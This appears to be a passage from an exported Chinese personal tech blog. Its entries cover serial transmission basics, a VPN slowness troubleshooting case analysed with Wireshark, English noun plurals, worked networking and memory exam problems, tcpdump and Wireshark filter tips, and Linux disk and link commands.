因为并行传输和串行传输各自的这些优缺点，导致并行传输仅仅用于短距离传输，而长距离传输则采用串行传输；同时，在短距离传输中，串行传输也在逐步取代并行传输。 什么是异步传输呢？ 计算机的键盘与主机之间的数据传输就是异步传输。 在键盘上按下一个字母键、数字键或特殊字符键，键盘就需要向主机发送一个对应的长度为8比特的ASCII字符，这个8比特的ASCII字符就是需要发送的数据，大小为1个字节。 如上图所示：例如，当用户按下小写字母键“k”，键盘需要向主机发送字符“01101011” 用户可能在任意时刻按键盘，所以键盘向主机发送数据的时间不是固定的，也不会事先约好，任何时刻都有可能发送。 主机事先并不知道键盘什么时候会给自己发送数据，只能静静地等待，一旦发现键盘向自己发送数据，则马上接收。 主机如何发现键盘开始向自己发送数据了呢？ 当键盘不需要向主机发送有效数据时，也就是键盘处于空闲（idle）时，键盘会连续不断地向主机发送比特“1”，告诉主机自己处于空闲状态。比特“1”用正电平表示，也就是键盘一直向主机发送正电平，表示当前没有有效数据发送给主机。 当键盘被按下，键盘需要向主机发送数据时，键盘会先在数据前添加比特“0”，组成新字符，再发送。 例如，如上图所示，发送数据“01101011”之前，先在“01101011”的前面添加“0”，组成新字符“011010110” 比特“0”可以用零电平表示。 如上图所示，键盘处于空闲时，主机接收的一直是比特“1”（正电平），当主机突然接收到比特“0”（零电平）时，马上反应过来，键盘在向自己发送有效数据，则主机开始接收“0”后面的有效数据，这个“0”相当于这个新字符的起始位（start bit）。 主机开始接收有效数据后，怎么才能知道有效数据接收完了要停下来呢？ 为了解决这个问题，键盘和主机事先约定好： 每次发送的有效数据为1个字节，即8个比特 数据的传输速率（例如1000比特/秒） 键盘在有效数据前面添加起始位（比特0），以通知主机，数据开始发送 键盘在有效数据后面添加停止位（比特1），以通知主机，数据发送结束 下图显示的是：键盘根据和主机的约定，发送给主机的数据和对应的信号。 当按键“k”被按下时，键盘实际上发送的是“起始位”+k对应的ASCII码+“停止位”。 键盘发送信号的过程： 键盘在空闲时，连续地发送正电平给主机，表示当前没有有效数据发送给主机。 当按键“k”被按下时，键盘发送“起始位”+k对应的ASCII码+“停止位”这3者所对应的信号。然后紧跟着继续发送正电平，表示又处于空闲状态。 主机接收信号的过程： 主机开始接收到的一直是正电平，表示当前没有有效数据发送给主机。 主机接收到起始位比特“0”（零电平）后，开始接收比特“0”后面的有效数据。 根据约定，有效数据为1个字节，共8个比特；数据的传输速率例如为1000比特/秒，也就是每毫秒传输1个比特，则8个比特的传输时间为8毫秒。 所以主机根据自己的时钟，在起始位比特“0”后面的8毫秒内接收有效数据。 具体的接收方式（举例说明）是： 主机在起始位后面的0.5毫秒、1.5毫秒、2.5毫秒、3.5毫秒、4.5毫秒、5.5毫秒、6.5毫秒、7.5毫秒分别对信号进行采样，也就是在每个比特的正中间进行采样，以获得这8比特的有效数据。 根据约定，8比特的有效数据后面跟着的是停止位。 如果主机在第8.5毫秒接收到比特“1”（停止位），则主机可以确定数据的发送确实结束了，则结束有效数据的接收，并接受所接收的数据。 如果主机在第8.5毫秒接收到的不是比特“1”（停止位），则主机判断传输过程中发生错误，就放弃所接收到的数据。 无论接受还是放弃所接收到的数据，主机都不会向键盘进行反馈。 键盘向主机发送数据后，就撒手不管了，不会等待主机的确认或其他任何反馈。 在停止位之后，主机接收到的是表示空闲的正电平，继续等待键盘发送数据。]]></content>
      <categories>
        <category>收录文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[访问X友软件卡顿]]></title>
    <url>%2F2019%2F06%2F11%2F%E8%AE%BF%E9%97%AEX%E5%8F%8B%E8%BD%AF%E4%BB%B6%E5%8D%A1%E9%A1%BF%2F</url>
    <content type="text"><![CDATA[2017年应用访问卡慢分析1.基本情况：客户环境现象： 总部和分支使用sangfor vpn对接，分支内网电脑ping总部内网服务器，没有丢包，没有延时。但是在分支使用X友客户端访问总部的X友服务器会出现卡顿（即打开客户端后，有些内容显示出来的等待时间较长） 为了排错，客户那边基本没有其他流量在跑。 客户内网拓扑： 总部和分部通过woc做vpn对接（没开加速），其中eth0口是内网口，pppoe和wan（eth2）口是外网口。分支woc的wan口（pppoe）地址是100.64.7.184，eth0（lan口）地址是10.37.11.254，lan口下连一台测试电脑10.37.11.180。总部单臂部署，X友服务器是10.37.1.77。分支pc通过X友软件和总部的X友服务器做数据交互。 2.排错操作： 在分支客户端电脑开始访问X友前，在分支woc和总部woc的eth0口，vpntun口，wan口写下抓包命令。写完之后执行命令，之后再用电脑正式访问X友。看到现象后，等待几秒再停止所有接口的抓包。 其实在抓到上述6份比较漂亮的包之前，我还重复上述操作过几次。虽然时间比较久了，但是我看到自己有导出csv的后缀文件，估计是我那时候想通过比较几个文件中的ip.id来判断访问应用的时候是否存在丢包。估计那时候我没看出啥东西来，就纯浪费时间去了。 后来听说X友这种应用访问卡慢，是因为小包交互过多导致的。就试着打开了一个包fenzhieth0.pcap，然后输入过滤条件，来看下200字节以下的包有多少。emmmm一看占比57.6%呢，小包很多了很多了 于是脑补出理由，打电话给渠道。举个例子，访问X友打开软件要传输15000字节的数据，公网延时是20-30ms，比如小包只传100字节，那这15000字节的数据就要传输150次，时间上就是20ms*150，这样访问就会出现卡顿的情况。如果是用ftp等测试，每次传输是1000字节的话，就是传输15次，所以访问ftp服务器的时候你就不会觉得卡。所以这是X友那边发包机制的问题，和我们设备没有关系 渠道觉得好有道理，然后就信了，之后他去和客户解释就再也没找我了。工单关闭 3.上述排错错在哪 自己想当然的瞎JB乱讲，同时基础概念不清晰，或者说是完全没有概念 在TCP中，发送方和接收方都会存在一个发送窗口和接受窗口。发送窗口表示我发送方一口气能发送多少数据，接收窗口表示我接收方还能接收多少数据放在缓存区中。发送方要尽量保证多发数据，同时也得保证接收方能接收的过来，不至于数据发生溢出。MSS是一个数据段的数据最大长度，那么发送窗口和MSS存在啥关系呢。刚刚说道，发送窗口表示我发送方一口气能发送多少数据，那么MSS的值就确定了，我要一口气发这么多数据要发出多少个包。举个例子来说，我发送方一口气能发送1000个字节，但是一个数据段的MSS是100字节，那么我一口气就能发10个包出去。 给渠道说的理由，看上去好像没问题。其实概念就没弄清。给渠道的说法表明，我的数据包是一个一个发出的，但是实际上TCP中不是这么传输数据的 4.重新整理排错思路 访问一个应用卡慢，分两种情况。一个是网络问题，一个是设备性能问题。 ping测试是在网络层的测试。客户环境中ping测试不丢包不延时，基本上可以判断网络是没啥问题的 之前做了这么一个操作，把pcap文件导出成csv文件，想通过比较各个csv文件中是否存在丢包。但是没有看是什么东西来，而且上述操作比较耗时间。要知道的是，如果数据包丢失，就会导致重传或是有重复ACK。那我们是不是可以通过wireshark工具来自动分析下 先通过过滤条件，把测试电脑与服务器的互访流量给过滤处理 然后在把文件重新保存一份 先打开fenzhieth0这个包。过滤出客户端和服务器双向交互的流量 随机选择一个包，然后右键点击Follow—&gt;tcp stream，过滤出一个tcp连接的互访流量 然后点击统计 statistics—&gt;TCP Stream Graphs—&gt;time sequence （stevens），可以看到该连接，一个方向上的seq号增长情况 可以看到弹出下框，也就意味着。在该连接中，服务器到用户客户端方向的数据流增长过程中，有5s左右是卡住了。那我们通过Stevens图，可以找到卡住的2个点，包号分别是467号包与819号包 可以看到下图，服务器在等待客户端发送816号包。而816号包的发出，是在468号包发出之后耗时近6s。 后续又按上述操作，观察了其他的几个tcp连接，以及zongbueth0口的抓包情况。都是一模一样的，总会有几秒卡住 也就意味着，这是180这台客户端的问题 为什么会出现这种情况，这就是X友厂商应该去分析的了。因为这个是X友应用层层面的问题 5.联想 为什么和我们设备无关了？ ​ ——因为在woc的eth0口抓包，发现上图中468号包发出之后，隔了近6s才收到了816号包。我们设备都没做封装啥的操作呢，只是单纯接收包而已 用woc开启加速后，会有效果吗？ ​ ——个人认为不会，因为woc开启后，是分支的woc设备和分支内网电脑做交互。把woc设备当做是总部的服务器，那内网客户端和woc交互数据的时候，依旧会出现上面这种情况，因为这种情况是在客户端电脑上发生的。要想解决，就得从客户端上看是什么原因导致了这6s的延时发包。]]></content>
      <categories>
        <category>实战</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[英语名词]]></title>
    <url>%2F2019%2F05%2F06%2F%E8%8B%B1%E8%AF%AD%E5%90%8D%E8%AF%8D%2F</url>
    <content type="text"><![CDATA[英语名词1.名词简介名词是人（people）、地（places）、事（things）和想法（ideas） 1.1单复数名词singular and plural nouns单数名词只包含名词本身，只有一个事物 复数名词意味着有更多（more），即一个以上的事物 大部分名词由单数变成复数都是有规律的（即直接在名词后面+s）。但是也有部分名词的变化没有规律 2.名词种类2.1普通名词（common）和专有名词（proper）。普通名词在句首时，首字母才大写。而专有名词的首字母是一直大写 common nouns proper nouns city Chicago frog Kermit river Nile mountain Kilimanjaro 2.2具象名词（concrete）和抽象名词（abstract）。具象表示看得见摸得着的，而抽象名词则相反，比如一些概念。 3.不规则名词复数3.1-f变为-ves singular plural leaf leaves loaf loaves calf calves 3.2以en结尾的复数名词只需要记住一个，child要变成children 3.3单复数同形sheep，fish，bison 3.4突变体复数 singular plural foot feet woman women man men tooth teeth goose geese mouse mice louse lice 3.5外来词复数 语言 变化 单数 复数 规则变化复数 拉丁语 a—ae larva larvae larvas 拉丁语 us—i fungus fungi funguses 拉丁语 um—a datum data 无 拉丁语 ex—ices index indices indexes 希腊语 is—es thesis theses thesises 希腊语 on—a critecion critecia 无]]></content>
      <categories>
        <category>英语</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[软考试题3]]></title>
    <url>%2F2019%2F05%2F06%2F%E8%BD%AF%E8%80%83%E8%AF%95%E9%A2%983%2F</url>
    <content type="text"><![CDATA[软考试题3问题A、B是局域网上两个相距1km的站点，A采用同步传输方式以1Mb/s的速率向B发送长度为200，000字节的文件。假定数据帧长为128比特，其中首部为48比特:应答帧为22比特，A在收到B的应答帧后发送下一帧。传送文件花费的时间为（ ）s，有效的数据速率为（ ）Mb/s（传播速率为200m/us）A.1.6 B.2.4 C.3.2 D.3.6A.0.2 B.0.5 C.0.7 D.0.8 解析 数据传输的过程中，可以理解成是寄快递。比如我想给我妈寄一支牙刷，牙刷用纸盒子包着。我妈拿到这个快递后，真正有用的想要的也就只有这个牙刷而已，那个纸盒子不是真正想要的东西。不过纸盒子上会有寄件人和收件人的信息。 题干中说的假定数据帧长为128比特，其中首部为48比特，其中首部48比特就类似于是纸盒子。128比特就类似于是被纸盒子包着的牙刷。那此时真正有用的数据部分是多少比特呢？聪明如你，很快就知道了是128-48=80bit。也就是说这80bit就类似于是这个牙刷。 现在假设寄的不是牙刷，而是一个需要组装的电脑桌。这个桌子不像牙刷那么好寄，东西太多了，一个纸盒子可能还放不下，要多个纸盒子包着，然后再寄出去。 题干中说的200，000字节（即200，000x8=1600，000比特）的文件就类似于是需要组装的电脑桌。每个纸盒子只能放电脑桌部件的一部分，即每个盒子只能放80比特的内容。 那么此时需要多少个纸盒子装呢？聪明如你，相信已经知道了。1600 000/80=20 000。 一个纸盒子再加上里面的部件，合起来一共是128个比特。那么所有的包裹（纸盒子+电脑桌部件）加起来，占多少个比特呢。就是20 000x128=2560 000比特。 快递公司穷，只有一辆车来运包裹，一次还只能运一个。运过去之后，还得等对方说一句我收到了，才能接着发第二个包裹。对方说的那句我收到了，就类似于题干中说的22比特的应答帧。也就是说，我发20 000个包裹过去，居然要回应20 000次我收到了。 上述了解完后，可以开始做题了。我们知道如何计算一个数据帧从发出到对方接收所需要时间的公式，即发送时延+传播时延 发送时延=数据帧长度/数据速率。把题中数值带入，即128bit/1Mbps=0.000128s。 传播时延=两点间距离/光速的三分之二。把题中数值带入，即1000m/（2x10^8）mps=0.000005s 所以从发送方发出一个帧到接收方接收，所需要的时间是0.000128+0.000005s=0.000133s 我们把包裹发出去，还得等对方说句收到了才能继续发下一个包裹。那么对方说一句收到了，到我们发送方接收到需要多少时间呢？同理可得，发送时延=数据帧长度/数据速率。把题中数值带入，即22bit/1Mbps=0.000022s。传播时延=两点间距离/光速的三分之二。把题中数值带入，即1000m/（2x10^8）mps=0.000005s。所以需要的时间是0.000022s+0.000005s=0.000027s 综上，一来一回所需要的时间就是0.000027s+0.000133s=0.00016s 这还只是一个包需要的时间，现在要发20 000个包，那总共需要多长时间呢？对的，0.00016x20 000=3.2s 最后一问，问你有效数据速率是多少。你的电脑桌就是真正有效的东西，总共也就1600，000比特，为了发这1600000比特，花了一共3.2s的时间。所以有效数据速率就是1600000bit/3.2s=500 000bps=0.5Mbps]]></content>
      <categories>
        <category>软考</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[软考试题2]]></title>
    <url>%2F2019%2F05%2F06%2F%E8%BD%AF%E8%80%83%E8%AF%95%E9%A2%982%2F</url>
    <content type="text"><![CDATA[软考试题2问题用64K×8的RAM芯片和32K×16的ROM芯片设计一个256K×16的存储器，地址范围为00000H～3FFFFH，其中ROM的地址范围为10000H～1FFFFH，其余为RAM的地址。则地址线为（）根，数据线为（）根；RAM需要（）片，ROM需要（）片。问题1选项A 18 B 9 C 16 D 8问题2选项A 18 B 9 C 16 D 8问题3选项A 1 B 2 C 3 D 6问题4选项A 12 B 2 C 9 D 6 解析 64Kx8表示什么？ 表示一个芯片的容量。其中64K表示一个芯片内地址块的数目，8表示每个地址块里面存放的比特位数。 其中，1K=1024，1M=1024K。64K=64x1024=65536，即一个芯片内有65536个地址块 你可以理解成，有一个大菜地（芯片），你把这个大菜地分成65536个小菜地（地址块）。每个小菜地里面都能种8颗白菜（比特位数）。一个芯片的容量就是整个大菜地里面能种的白菜数量。 64Kx8与地址线，数据线的关系？ 64K是一个十进制数，即$2^{16}$。 地址线传递地址信息。如果用1个比特，可以表示2个地址块（地址块数目是$2^1$），即编号为0的地址块和编号为1的地址块。如果用2个比特，可以表示4个地址块（地址块数目是$2^2$），即编号为00，01，10，11的四个地址块。那么我有16个比特的话，就能表示64K个地址块。一根地址线就占一个比特位，有16根地址线就表示有16个地址比特位。 数据线传递数据信息。一根数据线就占一个比特位，8根数据线就占8个数据比特位。 这些所谓的线，通过电平的高低变化来表示0或1。只是说不同的线，传递的信息是不同的。地址线传地址信息，数据线传数据信息，控制线传控制信息。这些信息是用0和1表示出来的。 一个256K×16的存储器，由64K×8的RAM芯片和32K×16的ROM芯片组成。 你可以理解成，一个超级大菜地分成2个中型菜地，一个种白菜，一个种辣椒。 这两个中型菜地又分别由小菜地（RAM和ROM芯片）组成。 一个256K×16的存储器，地址范围为00000H～3FFFFH（地址编号为十六进制数）。表示有（3FFFF-00000+1）H个地址块。你想下如果有3个数，编号分别为0~3，是不是一共有4个地址块。用3-0=3是不对的，还得再+1。 即这个存储器（超级大菜地）有（3FFFF-00000+1）H=40000H个地址块，每个地址块能容纳16个比特位数（种16个农作物）。 其中ROM的地址范围为10000H～1FFFFH，这是占了超级大菜地里面的一部分地址块。这部分地址块的数目是多少呢？是（1FFFF-10000+1）H=10000H个。这个十六进制数换成十进制数是64K。 存储器中ROM芯片给的地址块是64K，每个地址块能容纳16个比特。所以存储器中关于ROM的总容量就是64Kx16。 由于题目中说了，存储器是由32K×16的ROM芯片组成。ROM总容量已知，每个ROM芯片的容量也已知，此时问你需要多少片ROM，聪明如你，相信已经知道答案了。（64Kx16）/（32Kx16）=2 ROM占了整个存储器的地址块有64K个。存储器共有256K个。那么留下来给RAM的地址块数目即是（256-64）K=192K个。RAM的总容量就是192Kx16。 知道RAM的总容量，知道每片RAM芯片的容量64K×8，问你需要多少片RAM。聪明如你，相信已经知道答案了。（192Kx16）/（64Kx8）=6]]></content>
      <categories>
        <category>软考</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[tcpdump技巧]]></title>
    <url>%2F2019%2F04%2F30%2Ftcpdump%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[tcpdump使用技巧1.监视指定网络接口的数据包 [root@www ~]# tcpdump -i eth1 2.也可以指定ip,例如截获所有210.27.48.1 的主机收到的和发出的所有的数据包 [root@www ~]# tcpdump host 210.27.48.1 3.截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信 [root@www ~]# tcpdump host 210.27.48.1 and \ (210.27.48.2 or 210.27.48.3 \ ) 4.获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包 [root@www ~]# tcpdump ip host 210.27.48.1 and ! 210.27.48.2 5.截获主机webserver发送的所有数据 [root@www ~]# tcpdump -i eth0 src host webserver 6.监视所有送到主机webserver的数据包 [root@www ~]# tcpdump -i eth0 dst host webserver 7.获取主机210.27.48.1接收或发出的telnet包 [root@www ~]# tcpdump tcp port 23 and host 210.27.48.1 8.打印所有源地址或目标地址是本地主机的IP数据包 [root@www ~]# tcpdump ip and not net localnet 9.打印长度超过576字节 [root@www ~]# tcpdump ip[2:2] &gt; 576 10.第一个n表示以IP地址的方式显示主机名，第二个N是以端口数字的形式代替服务名。 [root@www ~]# tcpdump -nn [root@www ~]# tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap(1)tcp: ip icmp arp rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型(2)-i eth1 : 只抓经过接口eth1的包(3)-t : 不显示时间戳(4)-s 0 : 抓取数据包时默认抓取长度为68字节。加上-S 0 后可以抓到完整的数据包(5)-c 100 : 只抓取100个数据包(6)dst port ! 22 : 不抓取目标端口是22的数据包(7)src net 192.168.1.0/24 : 数据包的源网络地址为192.168.1.0/24(8)-w ./target.cap : 保存成cap文件，方便用ethereal(即wireshark)分析]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[wireshark技巧]]></title>
    <url>%2F2019%2F04%2F30%2Fwireshark%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[wireshark技巧 资料来源： 1.EMC中文支持论坛 2.如果看了这个你还是不会用Wireshark-那就来找我吧-8月6日完结 3.Linux命令手册-tcpdump 4.Linux上使用wireshark(tshark)抓包分析 5.tcpdump使用技巧 1.抓包前设置过滤条件（捕捉过滤器）尽量避免使用抓包过滤。即便多看几个报文，也比漏看一个报文要好。当你抓取了大量报文的时候，用显示过滤（过滤选项也更多）来重点查看某一数据流。 1.1 抓取指定IP地址的数据流： host 10.3.1.1：抓取发到/来自10.3.1.1的数据流 host 2406:da00:ff00::6b16:f02d：抓取发到/来自IPv6地址2406:da00:ff00::6b16:f02d的数据流 not host 10.3.1.1：抓取除了发到/来自10.3.1.1以外的所有数据流 src host 10.3.1.1：抓取来自10.3.1.1的数据流 dst host 10.3.1.1：抓取发到10.3.1.1的数据流 host 10.3.1.1 or 10.3.1.2：抓取发到/来自10.3.1.1，以及与之通讯的所有数据流，与10.3.1.2，以及与之通讯的所有数据流 host www.espn.com：抓取发到/来自所有解析为www.espn.com的IP地址的数据流 1.2 抓取指定IP地址范围的数据流: net 10.3.0.0/16：抓取网络10.3.0.0上发到/来自所有主机的数据流(16表示长度) net 10.3.0.0 mask 255.255.0.0：与之前的过滤结果相同 ip6 net 2406:da00:ff00::/64：抓取网络2406:da00:ff00:0000(IPv6)上发到/来自所有主机的数据流 not dst net 10.3.0.0/16：抓取除了发到以10.3开头的IP地址以外的所有数据流 not src net 10.3.0.0/16：抓取除了来自以10.3开头的IP地址以外的所有数据流 ip proto &lt; protocol code &gt;：抓取ip协议字段等于&lt; protocol code &gt;值的报文。如TCP(code 6), UDP(code 17), ICMP(code 1)。 ip[2:2]==&lt; number &gt;：ip报文大小 ip[8]==&lt; number &gt;：TTL(Time to Live)值 ip[9]==&lt; number &gt;：协议值 icmp[icmptype]==&lt; identifier &gt;: 抓取 ICMP代码等于identifier的ICMP报文, 如icmp-echo 以及 icmp-request。 方括号中第一个数字表示从协议头开始的偏移量，第二个数字表示需要观察多少位。 1.3 抓取发到广播或多播地址的数据流:只需侦听广播或多播数据流，就可以掌握网络上主机的许多信息。 ip broadcast：抓取广播报文 ip multicast：抓取多播报文 dst host ff02::1：抓取到IPv6多播地址所有主机的数据流 dst host ff02::2：抓取到IPv6多播地址所有路由器的数据流 1.4 抓取基于MAC地址的数据流:当你需要抓取发到/来自某一主机的IPv4或IPv6数据流，可创建基于主机MAC地址的抓包过滤条件。 应用MAC地址时，需确保与目标主机处于同一网段。 ether host 00:08:15:00:08:15：抓取发到/来自00:08:15:00:08:15的数据流 ether src 02:0A:42:23:41:AC：抓取来自02:0A:42:23:41:AC的数据流 ether dst 02:0A:42:23:41:AC：抓取发到02:0A:42:23:41:AC的数据流 not ether host 00:08:15:00:08:15：抓取除了发到/来自00:08:15:00:08:15以外的所有数据流 ether broadcast或ether dst ff:ff:ff:ff:ff:ff：抓取广播报文 ether multicast：多播报文 抓取指定以太网类型的报文：ether proto 0800 抓取指定VLAN：vlan &lt; vlan number &gt; 抓取指定几个VLAN：vlan &lt; vlan number &gt; and vlan &lt; vlan number &gt; 1.5 抓取基于指定应用的数据流:你可能需要查看基于一个或几个应用的数据流。抓包过滤器语法无法识别应用名，因此需要根据端口号来定义应用。通过目标应用的TCP或UDP端口号，将不相关的报文过滤掉。 port 53：抓取发到/来自端口53的UDP/TCP数据流（典型是DNS数据流） not port 53：抓取除了发到/来自端口53以外的UDP/TCP数据流 port 80：抓取发到/来自端口80的UDP/TCP数据流（典型是HTTP数据流） udp port 67：抓取发到/来自端口67的UDP数据流（典型是DHCP据流） tcp port 21：抓取发到/来自端口21的TCP数据流（典型是FTP命令通道） portrange 1-80：抓取发到/来自端口1-80的所有UDP/TCP数据流 tcp portrange 1-80：抓取发到/来自端口1-80的所有TCP数据流 1.6 抓取结合端口的数据流:当你需要抓取多个不连续端口号的数据流，将它们通过逻辑符号连接起来，如下图所示： port 20 or port 21：抓取发到/来自端口20或21的UDP/TCP数据流（典型是FTP数据和命令端口） host 10.3.1.1 and port 80：抓取发到/来自10.3.1.1端口80的数据流 host 10.3.1.1 and not port 80：抓取发到/来自10.3.1.1除了端口80以外的数据流 udp src port 68 and udp dst port 67：抓取从端口68到端口67的所有UDP数据流（典型是从DHCP客户端到DHCP服务器） udp src port 67 and udp dst port 68：抓取从端口67到端口68的所有UDP数据流（典型是从DHCP服务器到DHCP客户端） 抓取TCP连接的开始（SYN）和结束（FIN）报文，配置tcp[tcpflags] &amp; (tcp-syn|tcp-fin)!=0 抓取所有RST(Reset)标志位为1的TCP报文，配置tcp[tcpflags] &amp; (tcp-rst)!=0 less &lt; length &gt;：抓取小于等于某一长度的报文，等同于len &lt;=&lt; length &gt; greater &lt; length &gt;：抓取大于等于某一长度的报文，等同于len &gt;=&lt; length &gt; SYN: 建立连接的信号 FIN: 关闭连接的信号 ACK: 确认接收数据的信号 RST: 立即关闭连接的信号 PSH: 推信号，尽快将数据转由应用处理 tcp[13] &amp; 0x00 = 0: No flags set (null scan) tcp[13] &amp; 0x01 = 1: FIN set and ACK not set tcp[13] &amp; 0x03 = 3: SYN set and FIN set tcp[13] &amp; 0x05 = 5: RST set and FIN set tcp[13] &amp; 0x06 = 6: SYN set and RST set tcp[13] &amp; 0x08 = 8: PSH set and ACK not set tcp[13]是从协议头开始的偏移量，0,1,3,5,6,8是标识位。 2.抓包后设置过滤条件（显示过滤器）2.1 协议过滤器 arp：显示所有包括ARP请求和回复在内的所有ARP数据流。 ip：显示内含IPv4头在内的（如ICMP目的地址不可达报文，在ICMP报文头之后返回到来方向的IPv4头）IP数据流。 ipv6：显示所有IPv6数据流，包括内含IPv6报文头的IPv4报文，如6to4，Teredo，以及ISATAP数据流。 tcp：显示所有基于TCP的数据流。 2.2 应用过滤器 bootp：显示所有DHCP数据流（基于BOOTP）。 dns：显示包括TCP区域传输以及基于标准UDP的DNS请求和回复在内的所有DNS数据流。 tftp：显示所有TFTP（Trivial File Transfer Protocol）数据流。 http：显示所有HTTP命令，回复以及数据传输报文，但不显示TCP握手报文，TCP ACK报文以及TCP结束报文。 icmp：显示所有ICMP报文。 2.3 字符过滤器 tcp.analysis.flags：显示所有包含TCP分析标识的所有报文，包括报文丢失，重传，或零窗口标识。 tcp.analysis.zero_window：显示含有表明发送方的接收缓存用完标识的报文。 2.4 域过滤器 boot.option.hostname：显示所有包含主机名的DHCP数据流（DHCP基于BOOTP）。 http:host：显示所有包含HTTP主机名字段的所有HTTP报文。此报文是客户端向网络服务器发送请求时发出的。 ftp.request.command：显示所有包含命令的FTP数据流，比如USER，PASS，或RETR命令。 2.5 显示过滤器的比较运算符 ==或eq 例如：ip.src == 10.2.2.2 显示所有源地址为10.2.2.2的IPv4数据流 ！=或ne 例如：tcp.srcport != 80 显示源端口除了80以外的所有TCP数据流 gt 或 &gt; 例如：frame.time_relative &gt; 1 显示距前一个报文到达时间相差1秒的报文 &lt;或lt 例如：tcp.window_size &lt; 1460 显示当TCP接收窗口小于1460字节时的报文 ge 或 &gt;= 例如：dns.count.answers &gt;= 10 显示包含10个以上answer的DNS响应报文 &lt;=或le 例如：ip.ttl &lt;= 10 显示IP报文中Time to Live字段小于等于10的报文 contains 例如：http contains “GET” 显示所有HTTP客户端发送给HTTP服务器的GET请求 对于基于TCP应用的过滤条件采用比较运算符。例如，如果想看端口80上面的HTTP数据流，使用HTTP.port==80。 小贴士： 运算符两边不用留空格。ip.src == 10.2.2.2与ip.src==10.2.2.2的效果是相同的。 2.6 举例应用2.6.1 按照某一IP地址或主机过滤报文： 例如：ip.addr==10.3.1.1 显示在IP源地址字段或IP目的地址字段包含10.3.1.1的帧。 例如：！ip.addr==10.3.1.1 显示除了在IP源地址字段或IP目的地址字段包含10.3.1.1以外的帧。 例如：ipv6.addr==2406:da00:ff00::6b16:f02d 显示以2406:da00:ff00::6b16:f02d为源地址或目的地址的帧。 例如：ip.src==10.3.1.1 显示所有来自10.3.1.1的数据流。 例如：ip.dst==10.3.1.1 显示所有发往10.3.1.1的数据流 例如：ip.host==www.wireshark.org 显示所有解析为www.wireshark.org的IP 2.6.2 按照某一IP地址范围过滤报文：可以使用&gt;或&lt;比较运算符或逻辑运算符&amp;&amp;查找某一地址范围内的报文。 例如：ip.addr&gt;10.3.0.1&amp;&amp;ip.addr&lt;10.3.0.5 显示来自或发往10.3.0.2，10.3.0.3，10.3.0.4的数据流。 例如：(ip.addr&gt;=10.3.0.1&amp;&amp;ip.addr&lt;=10.3.0.6)&amp;&amp;!ip.addr==10.3.0.3 显示来自或发往10.3.0.1，10.3.0.2，10.3.0.4，10.3.0.5，10.3.0.6的数据流，10.3.0.3排除在外。 例如：ipv6.addr&gt;=fe80::&amp;&amp;ipv6.addr&lt;fec0:: 显示IPv6地址从0xfe80到0xfec0开头的数据流。 2.6.3 按照某一IP子网过滤报文：可以通过ip.addr字段名定义一个子网。这种格式使用IP地址后跟斜杠以及一个后缀，表明IP地址中定义的网络部分的比特数。 例如：ip.addr==10.3.0.0/16 显示在IP源地址或目的地址字段以10.3开头的数据流。 例如：ip.addr == 10.3.0.0/16 &amp;&amp; ！ip.addr==10.3.1.1 显示除了10.3.1.1以外，在IP源地址或目的地址字段以10.3开头的数据流。 例如：!ip.addr == 10.3.0.0/16 &amp;&amp; !ip.addr==10.2.0.0/16 显示所有数据流，除了在IP源地址或目的地址字段以10.3和10.2开头的数据流 注意： 错误的用法导致不work： 错误：ip.addr != 10.2.2.2 显示在IP源地址或IP目的地址不包含10.2.2.2的报文。只要在源或目的IP地址不为10.2.2.2，报文就会被显示出来。这时隐含的或会导致实际上并未过滤任何报文。 正确：！ip.addr == 10.2.2.2 显示IP源地址和IP目的地址都不包含10.2.2.2的报文。 错误：!tcp.flags.syn==1 显示所有不含TCP SYN bit设置为1的报文。其他协议报文，必须UDP和ARP报文也符合这一过滤条件，因为它们的TCP SYN bit没有设置为1。 正确：tcp.flags.syn！=1 只显示包含SYN设置为0的TCP报文。]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[文件系统的简单操作]]></title>
    <url>%2F2019%2F04%2F30%2F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[文件系统的简单操作1.df和du命令df列出文件系统的整体磁盘使用量，df读取的数据几乎针对一整个文件系统，因为读取范围是超级区块内的信息。 123456789101112131415161718192021[root@vultr ~]# dfFilesystem 1K-blocks Used Available Use% Mounted ondevtmpfs 214728 0 214728 0% /devtmpfs 246392 0 246392 0% /dev/shm/dev/vda1 10291200 2231176 7519412 23% /# Filesystem表示文件系统在哪个磁盘分区# 1K-blocks表示单位为1k，可以利用-h来变成人们易于理解的单位格式# Mounted on表示挂载点--------------------------------------------------------------[root@vultr ~]# df -hFilesystem Size Used Avail Use% Mounted ondevtmpfs 210M 0 210M 0% /devtmpfs 241M 0 241M 0% /sys/fs/cgroup/dev/vda1 9.9G 2.2G 7.2G 23% /--------------------------------------------------------------[root@vultr ~]# df -ThFilesystem Type Size Used Avail Use% Mounted ondevtmpfs devtmpfs 210M 0 210M 0% /devtmpfs tmpfs 241M 0 241M 0% /sys/fs/cgroup/dev/vda1 ext4 9.9G 2.2G 7.2G 23% /# Type表示文件系统类型 dudu不同于df，du会在整个文件系统内去查找所有的文件数据 2.硬件链接和软链接（符号链接）2.1硬件链接目录的数据区块下新增一条文件名链接到某个inode号码的关联记录。即多个文件名对应到同一个inode号码。 硬链接的限制：1.不能跨文件系统。2.不能连接目录 123456789[root@vultr tmp]# ll -itotal 4 11618 -rw-r--r-- 1 root root 0 Apr 18 06:16 test[root@vultr tmp]# [root@vultr tmp]# ln test zhang[root@vultr tmp]# ll -itotal 4 11618 -rw-r--r-- 2 root root 0 Apr 18 06:16 test 11618 -rw-r--r-- 2 root root 0 Apr 18 06:16 zhang 